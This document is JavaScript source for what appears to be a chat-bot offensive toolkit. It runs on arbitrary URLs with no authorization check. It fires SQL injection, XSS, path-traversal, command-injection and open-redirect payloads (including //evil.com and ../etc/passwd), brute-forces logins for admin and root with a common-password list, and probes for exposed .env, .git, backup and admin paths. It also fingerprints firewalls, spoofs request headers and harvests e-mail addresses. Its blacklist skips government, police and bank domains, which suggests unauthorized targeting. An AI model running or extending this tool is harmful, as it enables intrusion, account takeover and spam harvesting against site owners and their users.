const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');

const { cleanin, normurl } = require('./utils');

const commonpass = [
    'admin', 'password', '123456', 'qwerty', 'abc123', 'password123', 'admin123',
    'letmein', 'welcome', 'monkey', 'dragon', '123456789', '12345678', '111111',
    '123123', 'login', 'secret', 'freedom', 'whatever', 'passw0rd', 'trustno1',
    'sunshine', 'shadow', 'baseball', 'football', 'superman', 'batman', 'starwars'
];

async function finddirs(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return [];
    const dirs = [
        'admin', 'login', 'wp-admin', 'backup', 'config', 'test', 'dev', 'api',
        'phpmyadmin', 'cpanel', 'dashboard', 'control', 'management', 'signin'
    ];
    const found = [];
    for (const dir of dirs) {
        try {
            const res = await axios.get(`${cleanurl}/${dir}`, {
                timeout: 5000
            });
            if (res.status === 200 || res.status === 403) found.push(`${cleanurl}/${dir}`);
        } catch (e) {}
    }
    return found;
}

async function scanweb(url) {
    const normalize = (u) => {
        try {
            if (!u.startsWith('http')) u = 'http://' + u;
            return new URL(u).origin;
        } catch {
            return null;
        }
    };

    const cleanurl = normalize(url);
    if (!cleanurl) {
        console.log('url invalid', url);
        return null;
    }

    const blacklist = ['.gov', 'nsa', 'fbi', 'police', 'hospital', 'bank'];
    for (const b of blacklist)
        if (cleanurl.includes(b)) return null;

    const res = {
        sqli: [],
        xss: [],
        lfi: [],
        csrf: [],
        openredir: [],
        rce: []
    };

    const axinst = axios.create({
        timeout: 15000,
        maxRedirects: 5,
        headers: {
            'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.${Math.floor(Math.random()*999)} (KHTML, like Gecko) Chrome/91.0.${Math.floor(Math.random()*999)}.124 Safari/537.36`,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5'
        },
        validateStatus: s => s >= 200 && s < 600
    });

    const payloads = {
        sqli: [`'`, `'"`, `' or 1=1--`, `"' or '1'='1`, `' union select null--`, `' and sleep(5)--`],
        xss: [`<script>alert(1)</script>`, `" onmouseover="alert(1)`],
        lfi: [`../../../../../../etc/passwd`, `..%2f..%2f..%2f..%2fetc%2fpasswd`],
        rce: [`;sleep 5`, `|sleep 5`, `&sleep 5`],
        openredir: [`//evil.com`, `https://evil.com`]
    };

    let response = null;
    try {
        try {
            response = await axinst.get(cleanurl);
        } catch (err) {
            if (cleanurl.startsWith('http://')) {
                const alt = cleanurl.replace('http://', 'https://');
                try {
                    response = await axinst.get(alt);
                } catch {}
            } else if (cleanurl.startsWith('https://')) {
                const alt = cleanurl.replace('https://', 'http://');
                try {
                    response = await axinst.get(alt);
                } catch {}
            }
        }

        if (!response || !response.data) {
            console.log('conn fail', cleanurl);
            return null;
        }

        const html = response.data.toLowerCase();
        const $ = cheerio.load(response.data);

        if (!response.headers['content-security-policy']) {
            res.csrf.push('missing csp header');
        }

        const tokeninputs = $('input[name*=csrf], input[name*=token], input[name*=_token]');
        const tokenmeta = $('meta[name*=csrf], meta[name*=token]');
        if (tokeninputs.length === 0 && tokenmeta.length === 0 && !html.includes('csrf')) {
            res.csrf.push('csrf token missing in html');
        }

        const targets = new Set();
        targets.add(cleanurl);
        $('a[href]').each((_, el) => {
            const href = $(el).attr('href');
            try {
                const full = new URL(href, cleanurl).toString();
                if (full.startsWith(cleanurl)) targets.add(full.split('#')[0]);
            } catch {}
        });

        for (const target of Array.from(targets).slice(0, 5)) {
            for (const [type, plds] of Object.entries(payloads)) {
                for (const pld of plds) {
                    const id = require('uuid').v4().slice(0, 8);
                    const params = {
                        test: pld,
                        id
                    };
                    const query = qs.stringify(params);
                    const testurl = `${target}?${query}`;

                    try {
                        const r = await axinst.get(testurl);
                        const body = typeof r.data === 'string' ? r.data.toLowerCase() : '';

                        if (type === 'sqli' && body.includes('sql') && body.includes('error')) {
                            res.sqli.push(`sqli possible at ${testurl}`);
                        } else if (type === 'xss' && body.includes(pld.toLowerCase())) {
                            res.xss.push(`xss reflected at ${testurl}`);
                        } else if (type === 'lfi' && (body.includes('root:x') || body.includes('nologin'))) {
                            res.lfi.push(`lfi detected at ${testurl}`);
                        } else if (type === 'rce' && r.elapsedTime > 4000) {
                            res.rce.push(`rce possible at ${testurl}`);
                        } else if (type === 'openredir' && r.request?.res?.responseUrl?.startsWith('https://evil.com')) {
                            res.openredir.push(`redirect detected at ${testurl}`);
                        }
                    } catch {}
                }
            }
        }

    } catch (err) {
        console.log('main err', err.message);
        return null;
    }

    console.log('results for', cleanurl, JSON.stringify(res, null, 2));
    return res;
}

async function brutelogin(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return [];
    const found = [];
    const users = ['admin', 'root', 'user', 'test'];
    for (const user of users) {
        for (const pass of commonpass) {
            try {
                const res = await axios.post(`${cleanurl}/login`, {
                    user,
                    pass
                }, {
                    timeout: 3000
                });
                if (res.status === 200 && !res.data.includes('failed') &&
                    !res.data.includes('incorrect') && !res.data.includes('invalid')) {
                    found.push(`success: ${user}:${pass}`);
                }
            } catch (e) {}
            await new Promise(r => setTimeout(r, 1000));
        }
    }
    return found;
}

async function detectserver(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return null;
    try {
        const res = await axios.get(cleanurl, {
            timeout: 10000,
            maxRedirects: 5,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        });
        const hdrs = res.headers;
        const html = res.data.toLowerCase();
        let server = hdrs['server'] || 'not found';
        let powered = hdrs['x-powered-by'] || 'not found';
        if (html.includes('nginx')) server = 'Nginx';
        else if (html.includes('apache')) server = 'Apache';
        else if (html.includes('iis')) server = 'Microsoft-IIS';
        if (html.includes('php')) powered = 'PHP';
        else if (html.includes('asp.net')) powered = 'ASP.NET';
        return {
            server,
            powered
        };
    } catch (e) {
        return null;
    }
}

async function findemails(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return [];

    const emails = new Set();
    const visited = new Set();
    const tovisit = [cleanurl];

    const emailregex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const obfuscatedregex = /[a-zA-Z0-9._%+-]+\s*\$at\$\s*[a-zA-Z0-9.-]+\s*\$dot\$\s*[a-zA-Z]{2,}/gi;
    const atdotregex = /[a-zA-Z0-9._%+-]+\s*\$at\$\s*[a-zA-Z0-9.-]+\s*\$dot\$\s*[a-zA-Z]{2,}/gi;
    const spaceregex = /[a-zA-Z0-9._%+-]+\s+at\s+[a-zA-Z0-9.-]+\s+dot\s+[a-zA-Z]{2,}/gi;

    while (tovisit.length > 0 && visited.size < 15) {
        const current = tovisit.shift();
        if (visited.has(current)) continue;
        visited.add(current);

        try {
            const res = await axios.get(current, {
                timeout: 15000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                },
                validateStatus: () => true
            });

            if (res.status !== 200) continue;

            const $ = cheerio.load(res.data);

            const alltext = $('body').text() + ' ' + $('head').text();
            const htmlcontent = res.data;

            const foundnorm = alltext.match(emailregex);
            if (foundnorm) {
                foundnorm.forEach(email => {
                    if (email.length < 50 && !email.includes('example') && !email.includes('test@')) {
                        emails.add(email.toLowerCase());
                    }
                });
            }

            const foundobf = alltext.match(obfuscatedregex);
            if (foundobf) {
                foundobf.forEach(email => {
                    const clean = email.replace(/\$at\$/gi, '@').replace(/\$dot\$/gi, '.').replace(/\s+/g, '');
                    if (clean.includes('@') && clean.includes('.')) emails.add(clean.toLowerCase());
                });
            }

            const foundatdot = alltext.match(atdotregex);
            if (foundatdot) {
                foundatdot.forEach(email => {
                    const clean = email.replace(/\$at\$/gi, '@').replace(/\$dot\$/gi, '.').replace(/\s+/g, '');
                    if (clean.includes('@') && clean.includes('.')) emails.add(clean.toLowerCase());
                });
            }

            const foundspace = alltext.match(spaceregex);
            if (foundspace) {
                foundspace.forEach(email => {
                    const clean = email.replace(/\s+at\s+/gi, '@').replace(/\s+dot\s+/gi, '.').replace(/\s+/g, '');
                    if (clean.includes('@') && clean.includes('.')) emails.add(clean.toLowerCase());
                });
            }

            $('a[href^="mailto:"]').each((_, el) => {
                const mail = $(el).attr('href').replace('mailto:', '').split('?')[0].trim();
                if (mail && mail.includes('@')) emails.add(mail.toLowerCase());
            });

            const jsemails = htmlcontent.match(/['"`][a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}['"`]/g);
            if (jsemails) {
                jsemails.forEach(email => {
                    const clean = email.replace(/['"`]/g, '');
                    if (clean.length < 50 && !clean.includes('example')) emails.add(clean.toLowerCase());
                });
            }

            $('*').each((_, el) => {
                const attrs = ['data-email', 'data-mail', 'data-contact'];
                attrs.forEach(attr => {
                    const val = $(el).attr(attr);
                    if (val && val.includes('@')) emails.add(val.toLowerCase());
                });
            });

            const basedomain = new URL(cleanurl).hostname;
            const priolinks = [];
            const normlinks = [];

            $('a[href]').each((_, el) => {
                let href = $(el).attr('href');
                if (!href) return;

                if (href.startsWith('/')) href = cleanurl + href;
                else if (!href.startsWith('http')) return;

                try {
                    const linkdomain = new URL(href).hostname;
                    if (linkdomain !== basedomain) return;
                } catch {
                    return
                }

                const linktext = $(el).text().toLowerCase();
                const hreflower = href.toLowerCase();

                if (hreflower.includes('contact') || hreflower.includes('about') ||
                    hreflower.includes('support') || hreflower.includes('team') ||
                    hreflower.includes('info') || hreflower.includes('help') ||
                    linktext.includes('contact') || linktext.includes('about') ||
                    linktext.includes('support') || linktext.includes('team')) {
                    priolinks.push(href);
                } else if (tovisit.length + priolinks.length + normlinks.length < 25) {
                    normlinks.push(href);
                }
            });

            priolinks.forEach(link => {
                if (!visited.has(link)) tovisit.unshift(link);
            });

            normlinks.slice(0, 3).forEach(link => {
                if (!visited.has(link)) tovisit.push(link);
            });

        } catch (e) {
            continue;
        }
    }

    return [...emails].filter(email =>
        email.includes('@') &&
        email.includes('.') &&
        email.length > 5 &&
        email.length < 100 &&
        !email.includes('noreply@') &&
        !email.includes('no-reply@')
    );
}

async function detectwaf(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return {
        detected: false,
        type: 'not found'
    };

    const wafinfo = {
        detected: false,
        type: 'not found'
    };
    const customhdrs = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'X-Forwarded-For': '127.0.0.1'
    };

    try {
        const res = await axios.get(cleanurl, {
            headers: customhdrs,
            timeout: 10000,
            validateStatus: () => true
        });

        const hdrs = Object.fromEntries(Object.entries(res.headers).map(([k, v]) => [k.toLowerCase(), v?.toString().toLowerCase() || '']));
        const body = typeof res.data === 'string' ? res.data.toLowerCase() : '';
        const raw = JSON.stringify(hdrs) + body;

        const cfindicators = [
            hdrs['cf-ray'],
            hdrs['cf-cache-status'],
            hdrs['server']?.includes('cloudflare'),
            body.includes('checking your browser'),
            body.includes('cloudflare ray id'),
            body.includes('cf-browser-verification'),
            body.includes('__cf_bm'),
            body.includes('turnstile'),
            body.includes('cf-turnstile')
        ];

        const cfpresent = cfindicators.some(Boolean);
        const wafactive = [
            res.status === 403,
            res.status === 503,
            body.includes('access denied'),
            body.includes('security check'),
            body.includes('browser verification'),
            body.includes('checking your browser'),
            body.includes('turnstile')
        ].some(Boolean);

        if (cfpresent && wafactive) {
            wafinfo.detected = true;
            wafinfo.type = 'Cloudflare WAF';
            return wafinfo;
        }

        if (cfpresent && body.includes('turnstile')) {
            wafinfo.detected = true;
            wafinfo.type = 'Cloudflare Turnstile';
            return wafinfo;
        }

        const wafsigs = [
            {
                keys: ['ddos-guard', 'ddosguard'],
                headers_check: ['x-ddos-protection'],
                label: 'DDoS-Guard'
            },
            {
                keys: ['sucuri'],
                headers_check: ['x-sucuri-id', 'x-sucuri-cache'],
                label: 'Sucuri WAF'
            },
            {
                keys: ['incapsula', 'imperva', '_incap_ses'],
                headers_check: ['x-iinfo'],
                label: 'Imperva Incapsula'
            },
            {
                keys: ['aws'],
                headers_check: ['x-amzn-requestid', 'x-amz-cf-id'],
                label: 'AWS WAF'
            },
            {
                keys: ['akamai'],
                headers_check: ['x-akamai-transformed'],
                label: 'Akamai'
            },
            {
                keys: ['bigip', 'f5'],
                headers_check: ['x-waf-event-info'],
                label: 'F5 BIG-IP'
            },
            {
                keys: ['mod_security', 'modsecurity'],
                headers_check: [],
                label: 'ModSecurity'
            },
            {
                keys: ['barracuda'],
                headers_check: [],
                label: 'Barracuda WAF'
            },
            {
                keys: ['fastly'],
                headers_check: [],
                label: 'Fastly'
            },
            {
                keys: ['stackpath'],
                headers_check: [],
                label: 'StackPath'
            },
            {
                keys: ['ovh'],
                headers_check: [],
                label: 'OVH'
            },
            {
                keys: ['hetzner'],
                headers_check: [],
                label: 'Hetzner'
            },
            {
                keys: ['plesk'],
                headers_check: [],
                label: 'Plesk WAF'
            }
        ];

        for (const sig of wafsigs) {
            const bodymatch = sig.keys.some(key => raw.includes(key));
            const headermatch = sig.headers_check.some(header => hdrs[header]);
            const servermatch = sig.keys.some(key => hdrs['server']?.includes(key));

            if (bodymatch || headermatch || servermatch) {
                if (cfpresent && sig.label !== 'Cloudflare WAF') {
                    wafinfo.detected = true;
                    wafinfo.type = `Cloudflare + ${sig.label}`;
                    return wafinfo;
                } else if (!cfpresent) {
                    wafinfo.detected = true;
                    wafinfo.type = sig.label;
                    return wafinfo;
                }
            }
        }

        if (hdrs['server']?.includes('gws') || hdrs['x-cloud-trace-context'] || (body.includes('google') && res.status === 403)) {
            if (cfpresent) {
                wafinfo.detected = true;
                wafinfo.type = 'Cloudflare + Google Cloud Armor';
                return wafinfo;
            } else {
                wafinfo.detected = true;
                wafinfo.type = 'Google Cloud Armor';
                return wafinfo;
            }
        }

        if (cfpresent) {
            wafinfo.detected = true;
            wafinfo.type = 'Cloudflare CDN';
            return wafinfo;
        }

        if (!wafinfo.detected && (res.status === 403 || res.status === 406 || body.includes('access denied') || body.includes('forbidden') || body.includes('blocked'))) {
            wafinfo.detected = true;
            wafinfo.type = 'unknown WAF';
        }

    } catch {
        wafinfo.detected = true;
        wafinfo.type = 'unknown WAF';
    }

    return wafinfo;
}

async function chkssl(domain) {
    const cleandomain = cleanin(domain);
    if (!cleandomain || !require('./utils').isdomain(cleandomain)) return null;
    try {
        const res = await axios.get(`https://api.ssllabs.com/api/v3/analyze?host=${cleandomain}&publish=off&startNew=off&fromCache=on&all=done`, {
            timeout: 15000
        });
        if (res.data && res.data.endpoints) {
            return res.data.endpoints[0];
        }
        return null;
    } catch (e) {
        return null;
    }
}

async function chkhdrs(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return null;

    const finalhdrs = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    };

    try {
        let res;
        try {
            res = await axios.head(cleanurl, {
                timeout: 10000,
                headers: finalhdrs,
                maxRedirects: 5,
                validateStatus: () => true
            });
        } catch {
            res = await axios.get(cleanurl, {
                timeout: 10000,
                headers: finalhdrs,
                maxRedirects: 5,
                validateStatus: () => true
            });
        }

        const h = res.headers;
        const result = {
            'x-frame-options': h['x-frame-options'] || 'not set',
            'x-xss-protection': h['x-xss-protection'] || 'not set',
            'x-content-type-options': h['x-content-type-options'] || 'not set',
            'strict-transport-security': h['strict-transport-security'] || 'not set',
            'content-security-policy': h['content-security-policy'] || 'not set',
            'referrer-policy': h['referrer-policy'] || 'not set',
            'permissions-policy': h['permissions-policy'] || 'not set',
            'cross-origin-resource-policy': h['cross-origin-resource-policy'] || 'not set',
            'cross-origin-opener-policy': h['cross-origin-opener-policy'] || 'not set',
            'cross-origin-embedder-policy': h['cross-origin-embedder-policy'] || 'not set',
            'server': h['server'] || 'not set',
            'cf-ray': h['cf-ray'] || 'not set',
            'x-powered-by': h['x-powered-by'] || 'not set',
            'cache-control': h['cache-control'] || 'not set'
        };

        return result;
    } catch {
        return null;
    }
}

async function detectcms(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return ['invalid url'];
    try {
        const res = await axios.get(cleanurl, {
            timeout: 10000
        });
        const html = res.data.toLowerCase();
        const hdrs = res.headers;
        const cms = [];
        if (html.includes('wp-content') || html.includes('wordpress') || hdrs['x-wp-total']) cms.push('WordPress');
        if (html.includes('joomla') || html.includes('com_content')) cms.push('Joomla');
        if (html.includes('drupal') || html.includes('sites/default')) cms.push('Drupal');
        if (hdrs['x-powered-by'] && hdrs['x-powered-by'].includes('ASP.NET')) cms.push('ASP.NET');
        if (html.includes('magento') || html.includes('mage-')) cms.push('Magento');
        if (html.includes('shopify') || hdrs['x-shopify']) cms.push('Shopify');
        return cms.length > 0 ? cms : ['unknown'];
    } catch (e) {
        return ['detection failed'];
    }
}

async function findadmin(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return [];
    const adminpaths = [
        'admin', 'administrator', 'admin.php', 'admin.html', 'login', 'login.php',
        'signin', 'dashboard', 'control', 'panel', 'cp', 'wp-admin', 'admin/login',
        'admin/index', 'management', 'backend', 'user/login', 'auth'
    ];
    const found = [];
    for (const path of adminpaths) {
        try {
            const res = await axios.get(`${cleanurl}/${path}`, {
                timeout: 5000
            });
            if (res.status === 200 || res.status === 403) found.push(`${cleanurl}/${path}`);
        } catch (e) {}
    }
    return found;
}

async function findbackups(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return [];
    const backupfiles = [
        'backup.zip', 'backup.tar.gz', 'backup.sql', 'database.sql', 'db.sql',
        'dump.sql', 'config.bak', 'backup.txt', 'site.zip', 'www.zip', 'backup.rar',
        'backup.tar', 'data.sql.gz', 'archive.zip'
    ];
    const found = [];
    for (const file of backupfiles) {
        try {
            const res = await axios.get(`${cleanurl}/${file}`, {
                timeout: 5000
            });
            if (res.status === 200) found.push(`${cleanurl}/${file}`);
        } catch (e) {}
    }
    return found;
}

async function findapis(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return [];
    const apipaths = [
        'api', 'api/v1', 'api/v2', 'api/v3', 'rest', 'graphql', 'api/users',
        'api/auth', 'api/login', 'v1/api', 'v2/api', 'rest/api', 'api/data',
        'api/config', 'api/status', 'api/health'
    ];
    const found = [];
    try {
        const res = await axios.get(cleanurl, {
            timeout: 10000
        });
        const $ = cheerio.load(res.data);
        const scripts = $('script[src]').map((i, el) => $(el).attr('src')).get();
        const links = $('a[href]').map((i, el) => $(el).attr('href')).get();
        const potentialapis = [...scripts, ...links].filter(link => link && link.includes('api'));
        found.push(...potentialapis.map(link => new URL(link, cleanurl).toString()));
    } catch (e) {}
    for (const path of apipaths) {
        try {
            const res = await axios.get(`${cleanurl}/${path}`, {
                timeout: 5000
            });
            if (res.status === 200 || res.status === 401 || res.status === 403) {
                found.push(`${cleanurl}/${path}`);
            }
            const jsonres = await axios.get(`${cleanurl}/${path}.json`, {
                timeout: 5000
            });
            if (jsonres.status === 200) found.push(`${cleanurl}/${path}.json`);
        } catch (e) {}
    }
    return [...new Set(found)];
}

async function scanwp(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return [];
    const wppaths = [
        'wp-admin', 'wp-content', 'wp-includes', 'wp-config.php', 'wp-login.php',
        'wp-content/plugins', 'wp-content/themes', 'xmlrpc.php', 'wp-cron.php'
    ];
    const found = [];
    for (const path of wppaths) {
        try {
            const res = await axios.get(`${cleanurl}/${path}`, {
                timeout: 5000
            });
            if (res.status === 200 || res.status === 403) found.push(`${cleanurl}/${path}`);
        } catch (e) {}
    }
    try {
        const res = await axios.get(`${cleanurl}/wp-json/wp/v2`, {
            timeout: 5000
        });
        if (res.status === 200) found.push(`${cleanurl}/wp-json/wp/v2`);
    } catch (e) {}
    return found;
}

async function chkgit(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return [];
    const gitpaths = ['.git', '.git/config', '.git/HEAD', '.gitignore', '.git/logs'];
    const found = [];
    for (const path of gitpaths) {
        try {
            const res = await axios.get(`${cleanurl}/${path}`, {
                timeout: 5000
            });
            if (res.status === 200) found.push(`${cleanurl}/${path}`);
        } catch (e) {}
    }
    return found;
}

async function chkwebcfg(url) {
    const cleanurl = normurl(url);
    if (!cleanurl) return 'invalid url.';

    let findings = [];

    const paths = [
        '/.env', '/.git/config', '/.git/HEAD', '/phpinfo.php', '/test.php',
        '/admin/', '/backup/', '/config.php.bak', '/web.config.bak', '/robots.txt', '/sitemap.xml'
    ];

    for (const path of paths) {
        try {
            const target = `${cleanurl}${path}`;
            const res = await axios.get(target, {
                timeout: 5000,
                validateStatus: status => status >= 200 && status < 500
            });

            if (res.status === 200 && res.data.length > 0) {
                if (path.includes('.env') && res.data.includes('APP_KEY')) {
                    findings.push(`.env exposed: ${target}`);
                } else if (path.includes('.git/config') && res.data.includes('[remote "origin"]')) {
                    findings.push(`.git/config exposed: ${target}`);
                } else if (path.includes('phpinfo.php') && res.data.includes('phpinfo()')) {
                    findings.push(`phpinfo.php exposed: ${target}`);
                } else if (path.includes('robots.txt') || path.includes('sitemap.xml')) {
                    findings.push(`info file exposed: ${target}`);
                } else if (res.status === 200) {
                    findings.push(`file/dir exposed: ${target} (status: ${res.status})`);
                }
            }
        } catch (e) {}
    }

    if (findings.length === 0) {
        return 'no common web configs exposed.';
    }
    return `common web configs exposed:\n${findings.join('\n')}`;
}

function genpayload(type) {
    let payload = '';
    switch (type.toLowerCase()) {
        case 'xss':
            payload = '<script>alert("XSS")</script>';
            break;
        case 'sqli_error':
            payload = "' OR 1=1 --";
            break;
        case 'lfi':
            payload = '../../../../etc/passwd';
            break;
        case 'rce_linux':
            payload = '`id`';
            break;
        case 'rce_windows':
            payload = '|| calc.exe';
            break;
        default:
            payload = 'unknown payload type. use: xss, sqli_error, lfi, rce_linux, rce_windows.';
    }
    return payload;
}

async function dirbrute(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const dirs = await finddirs(url);
    if (dirs.length > 0) {
        await sendmsg(chatid, `dirs found\n${dirs.join('\n')}`);
    } else {
        await sendmsg(chatid, 'no dirs found');
    }
}

async function webscan(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    await sendmsg(chatid, `scanning web app: ${url}`);
    const results = await scanweb(url);
    if (results) {
        let res = `web scan results for ${url}\n\n`;
        if (results.sqli.length > 0) {
            res += `SQLi:\n${results.sqli.join('\n')}\n\n`;
        }
        if (results.xss.length > 0) {
            res += `XSS:\n${results.xss.join('\n')}\n\n`;
        }
        if (results.lfi.length > 0) {
            res += `LFI:\n${results.lfi.join('\n')}\n\n`;
        }
        if (results.csrf.length > 0) {
            res += `CSRF:\n${results.csrf.join('\n')}\n\n`;
        }
        if (results.openredir.length > 0) {
            res += `Open Redirect:\n${results.openredir.join('\n')}\n\n`;
        }
        if (results.rce.length > 0) {
            res += `RCE:\n${results.rce.join('\n')}\n\n`;
        }
        if (!results.sqli.length && !results.xss.length &&
            !results.lfi.length && !results.csrf.length &&
            !results.openredir.length && !results.rce.length) {
            res += 'no vulns detected';
        }
        await sendmsg(chatid, res);
    } else {
        await sendmsg(chatid, 'web scan failed');
    }
}

async function bruteforce(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const results = await brutelogin(url);
    if (results.length > 0) {
        await sendmsg(chatid, `brute force results\n${results.join('\n')}`);
    } else {
        await sendmsg(chatid, 'no brute force results');
    }
}

async function serverdetect(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const info = await detectserver(url);
    if (info) {
        await sendmsg(chatid, `server info ${url}\nserver: ${info.server}\nx-powered-by: ${info.powered}`);
    } else {
        await sendmsg(chatid, 'server detect error');
    }
}

async function emailfind(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const emails = await findemails(url);
    if (emails.length > 0) {
        await sendmsg(chatid, `emails found\n${emails.join('\n')}`);
    } else {
        await sendmsg(chatid, 'no emails found');
    }
}

async function wafdetect(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const waf = await detectwaf(url);
    if (waf && waf.detected) {
        await sendmsg(chatid, `waf found: ${waf.type}`);
    } else {
        await sendmsg(chatid, 'no waf detected');
    }
}

async function sslcheck(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'domain required');
    const domain = args[1];
    const data = await chkssl(domain);
    if (data) {
        await sendmsg(chatid, `ssl info for ${domain}\ngrade: ${data.grade || 'unknown'}\nstatus: ${data.statusMessage || 'unknown'}\nip: ${data.ipAddress || 'unknown'}`);
    } else {
        await sendmsg(chatid, 'ssl check failed or domain not found');
    }
}

async function headerscheck(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const hdrs = await chkhdrs(url);
    if (hdrs) {
        let res = `security headers for ${url}\n`;
        for (const [hdr, val] of Object.entries(hdrs)) {
            res += `${hdr}: ${val}\n`;
        }
        await sendmsg(chatid, res);
    } else {
        await sendmsg(chatid, 'headers check error');
    }
}

async function cmsdetect(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const cms = await detectcms(url);
    await sendmsg(chatid, `cms detect for ${url}\n${cms.join(', ')}`);
}

async function adminpanel(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const panels = await findadmin(url);
    if (panels.length > 0) {
        await sendmsg(chatid, `admin panels found\n${panels.join('\n')}`);
    } else {
        await sendmsg(chatid, 'no admin panels found');
    }
}

async function backupfiles(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const backups = await findbackups(url);
    if (backups.length > 0) {
        await sendmsg(chatid, `backup files found\n${backups.join('\n')}`);
    } else {
        await sendmsg(chatid, 'no backup files found');
    }
}

async function apiendpoints(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const endpoints = await findapis(url);
    if (endpoints.length > 0) {
        await sendmsg(chatid, `api endpoints found\n${endpoints.join('\n')}`);
    } else {
        await sendmsg(chatid, 'no api endpoints found');
    }
}

async function wordpressscan(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const paths = await scanwp(url);
    if (paths.length > 0) {
        await sendmsg(chatid, `wp paths found\n${paths.join('\n')}`);
    } else {
        await sendmsg(chatid, 'no wp install detected');
    }
}

async function gitexposure(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const paths = await chkgit(url);
    if (paths.length > 0) {
        await sendmsg(chatid, `git exposure found\n${paths.join('\n')}`);
    } else {
        await sendmsg(chatid, 'no git exposure detected');
    }
}

async function webcfg(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'url required');
    const url = args[1];
    const result = await chkwebcfg(url);
    await sendmsg(chatid, result);
}

async function payloadgen(chatid, args, sendmsg) {
    if (!args[1]) return sendmsg(chatid, 'type required');
    const type = args[1];
    const payload = genpayload(type);
    await sendmsg(chatid, `generated payload:\n${payload}`);
}

module.exports = {
    dirbrute,
    webscan,
    bruteforce,
    serverdetect,
    emailfind,
    wafdetect,
    sslcheck,
    headerscheck,
    cmsdetect,
    adminpanel,
    backupfiles,
    apiendpoints,
    wordpressscan,
    gitexposure,
    webcfg,
    payloadgen
};